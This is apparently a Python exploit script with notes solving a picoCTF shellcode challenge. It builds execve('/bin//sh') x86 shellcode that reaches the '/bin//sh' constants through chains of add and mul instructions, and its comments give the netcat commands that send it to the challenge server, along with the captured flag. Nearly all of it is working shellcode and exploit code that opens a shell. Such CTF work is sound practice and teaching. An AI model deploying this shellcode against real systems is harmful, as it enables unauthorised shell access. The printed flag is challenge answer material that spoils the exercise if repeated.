'''
To get a shell, run these commands:
$ python3 gen.py > code
$ (cat code; cat) | nc mercury.picoctf.net 40525
picoCTF{th4t_w4s_fun_5d991c7a5107a414}

The below process was a little tedious... you'll see why :/

Registers:
$eax   : 0xffffcb40  →  0x90904241
$ebx   : 0xffffcb60  →  0xf7fae5e0  →  0x00000000
$ecx   : 0xffffcb40  →  0x90904241
$edx   : 0xffffcb40  →  0x90904241
$esp   : 0xffffcb3c  →  0x080485cb  →  <execute+213> mov esp, ebx
$ebp   : 0xffffcb88  →  0xffffcf98  →  0x00000000
$esi   : 0xf7fad000  →  0x001e6d6c
$edi   : 0xf7fad000  →  0x001e6d6c
$eip   : 0xffffcb40  →  0x90904241

Normal shellcode:
                                // <_start>
    "\x31\xc9"                  // xor    %ecx,%ecx
    "\xf7\xe1"                  // mul    %ecx
    "\x51"                      // push   %ecx
    "\x68\x2f\x2f\x73\x68"      // push   $0x68732f2f "hs//"
    "\x68\x2f\x62\x69\x6e"      // push   $0x6e69622f "nib/"
    "\x89\xe3"                  // mov    %esp,%ebx
    "\xb0\x0b"                  // mov    $0xb,%al
    "\xcd\x80"                  // int    $0x80

xor ecx, ecx
mul ecx
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
mov al, 0xb
int 0x80

Modified:

"\x31\xc9" xor ecx
"\xf7\xe1" mul ecx
"\x51" push ecx
"\x90" nop
?
?
"\x89\xe3" mov ebx,esp
"\xb0\x0b" mov al,0xb
"\xcd\x80" int 0x80

Main issue: How to push those two values?
Use binary addition / multiply by 2!
'''

import sys

exp = b""
exp += b"\x31\xc9"  # xor ecx
exp += b"\xf7\xe1"  # mul ecx
exp += b"\x51\x90"  # push ecx + nop

'''
Push 0x68732f2f (0b1101000011100110010111100101111)
0:  31 c0                   xor    eax,eax
2:  31 db                   xor    ebx,ebx
4:  31 c9                   xor    ecx,ecx
6:  04 01                   add    al,0x1
8:  88 c3                   mov    bl,al
a:  04 01                   add    al,0x1
c:  88 c1                   mov    cl,al
e:  31 c0                   xor    eax,eax
10: 01 d8                   add    eax,ebx
12: f7 e1                   mul    ecx
14: 01 d8                   add    eax,ebx
16: f7 e1                   mul    ecx
18: f7 e1                   mul    ecx
1a: 01 d8                   add    eax,ebx
1c: f7 e1                   mul    ecx
1e: f7 e1                   mul    ecx
20: f7 e1                   mul    ecx
22: f7 e1                   mul    ecx
24: f7 e1                   mul    ecx
26: 01 d8                   add    eax,ebx
28: f7 e1                   mul    ecx
2a: 01 d8                   add    eax,ebx
2c: f7 e1                   mul    ecx
2e: 01 d8                   add    eax,ebx
30: f7 e1                   mul    ecx
32: f7 e1                   mul    ecx
34: f7 e1                   mul    ecx
36: 01 d8                   add    eax,ebx
38: f7 e1                   mul    ecx
3a: 01 d8                   add    eax,ebx
3c: f7 e1                   mul    ecx
3e: f7 e1                   mul    ecx
40: f7 e1                   mul    ecx
42: 01 d8                   add    eax,ebx
44: f7 e1                   mul    ecx
46: f7 e1                   mul    ecx
48: 01 d8                   add    eax,ebx
4a: f7 e1                   mul    ecx
4c: 01 d8                   add    eax,ebx
4e: f7 e1                   mul    ecx
50: 01 d8                   add    eax,ebx
52: f7 e1                   mul    ecx
54: 01 d8                   add    eax,ebx
56: f7 e1                   mul    ecx
58: f7 e1                   mul    ecx
5a: f7 e1                   mul    ecx
5c: 01 d8                   add    eax,ebx
5e: f7 e1                   mul    ecx
60: f7 e1                   mul    ecx
62: 01 d8                   add    eax,ebx
64: f7 e1                   mul    ecx
66: 01 d8                   add    eax,ebx
68: f7 e1                   mul    ecx
6a: 01 d8                   add    eax,ebx
6c: f7 e1                   mul    ecx
6e: 01 d8                   add    eax,ebx
70: 50                      push   eax
71: 90                      nop
'''

exp += b"\x31\xC0\x31\xDB\x31\xC9\x04\x01\x88\xC3\x04\x01\x88\xC1\x31\xC0\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\xF7\xE1\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\x50\x90"

'''
Push 0x6e69622f (0b1101110011010010110001000101111)
0:  31 c0                   xor    eax,eax
2:  31 db                   xor    ebx,ebx
4:  31 c9                   xor    ecx,ecx
6:  04 01                   add    al,0x1
8:  88 c3                   mov    bl,al
a:  04 01                   add    al,0x1
c:  88 c1                   mov    cl,al
e:  31 c0                   xor    eax,eax
10: 01 d8                   add    eax,ebx
12: f7 e1                   mul    ecx
14: 01 d8                   add    eax,ebx
16: f7 e1                   mul    ecx
18: f7 e1                   mul    ecx
1a: 01 d8                   add    eax,ebx
1c: f7 e1                   mul    ecx
1e: 01 d8                   add    eax,ebx
20: f7 e1                   mul    ecx
22: 01 d8                   add    eax,ebx
24: f7 e1                   mul    ecx
26: f7 e1                   mul    ecx
28: f7 e1                   mul    ecx
2a: 01 d8                   add    eax,ebx
2c: f7 e1                   mul    ecx
2e: 01 d8                   add    eax,ebx
30: f7 e1                   mul    ecx
32: f7 e1                   mul    ecx
34: 01 d8                   add    eax,ebx
36: f7 e1                   mul    ecx
38: f7 e1                   mul    ecx
3a: f7 e1                   mul    ecx
3c: 01 d8                   add    eax,ebx
3e: f7 e1                   mul    ecx
40: f7 e1                   mul    ecx
42: 01 d8                   add    eax,ebx
44: f7 e1                   mul    ecx
46: 01 d8                   add    eax,ebx
48: f7 e1                   mul    ecx
4a: f7 e1                   mul    ecx
4c: f7 e1                   mul    ecx
4e: f7 e1                   mul    ecx
50: 01 d8                   add    eax,ebx
52: f7 e1                   mul    ecx
54: f7 e1                   mul    ecx
56: f7 e1                   mul    ecx
58: f7 e1                   mul    ecx
5a: 01 d8                   add    eax,ebx
5c: f7 e1                   mul    ecx
5e: f7 e1                   mul    ecx
60: 01 d8                   add    eax,ebx
62: f7 e1                   mul    ecx
64: 01 d8                   add    eax,ebx
66: f7 e1                   mul    ecx
68: 01 d8                   add    eax,ebx
6a: f7 e1                   mul    ecx
6c: 01 d8                   add    eax,ebx
6e: 50                      push   eax
6f: 90                      nop
'''

exp += b"\x31\xC0\x31\xDB\x31\xC9\x04\x01\x88\xC3\x04\x01\x88\xC1\x31\xC0\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\xF7\xE1\x01\xD8\x50\x90"

exp += b"\x89\xe3"  # mov ebx,esp
exp += b"\x31\xc0"  # xor eax,eax (to clear its value)
exp += b"\x31\xc9"  # xor ecx,ecx (to clear its value)
exp += b"\xb0\x0b"  # mov al,0xb
exp += b"\xcd\x80"  # int 0x80

sys.stdout.buffer.write(exp)
